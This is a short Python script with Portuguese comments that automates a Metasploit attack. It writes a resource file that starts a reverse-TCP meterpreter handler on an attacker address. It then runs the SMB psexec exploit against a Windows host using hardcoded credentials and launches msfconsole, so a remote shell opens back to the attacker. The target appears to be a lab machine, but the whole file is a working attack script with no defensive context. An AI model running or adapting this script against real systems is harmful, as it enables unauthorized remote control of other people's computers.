import os
import sys

# Função para configurar e executar um manipulador de carga útil (payload handler)
def shell(metafile):
    # Usa o exploit multi/handler para manipular a carga útil
    metafile.write('use exploit/multi/handler\n')
    # Define o payload como windows/meterpreter/reverse_tcp
    metafile.write('set payload windows/meterpreter/reverse_tcp\n')
    # Define o endereço IP local (LHOST) do atacante
    metafile.write('set LHOST 192.168.0.200\n')
    # Define a porta local (LPORT) do atacante
    metafile.write('set LPORT 3000\n')
    # Inicia a exploração no modo job (-j)
    metafile.write('exploit -j\n')
    # Desabilita o manipulador de carga útil após o uso
    metafile.write('setg DisablePayloadHandler 1\n')

# Função para configurar e executar um exploit específico
def exploit(metafile):
    # Usa o exploit windows/smb/psexec para explorar vulnerabilidades SMB
    metafile.write('use exploit/windows/smb/psexec\n')
    # Define o endereço IP do host remoto (RHOST) alvo
    metafile.write('set RHOST 10.0.2.6\n')
    # Define o nome de usuário SMB (SMBUser) para autenticação
    metafile.write('set SMBUser IEUser\n')
    # Define a senha SMB (SMBPass) para autenticação
    metafile.write('set SMBPass Passw0rd!\n')
    # Define o payload como windows/meterpreter/reverse_tcp
    metafile.write('set payload windows/meterpreter/reverse_tcp\n')
    # Define o endereço IP local (LHOST) do atacante
    metafile.write('set LHOST 192.168.0.200\n')
    # Define a porta local (LPORT) do atacante
    metafile.write('set LPORT 3000\n')
    # Inicia a exploração no modo job (-j)
    metafile.write('exploit -j\n')

# Abre o arquivo meta.rc em modo escrita
metafile = open('meta.rc', 'w')

# Chama as funções shell e exploit, passando o arquivo aberto como argumento
shell(metafile)
exploit(metafile)

# Fecha o arquivo meta.rc
metafile.close()

# Executa o comando msfconsole com o arquivo meta.rc gerado
os.system('msfconsole -r meta.rc')
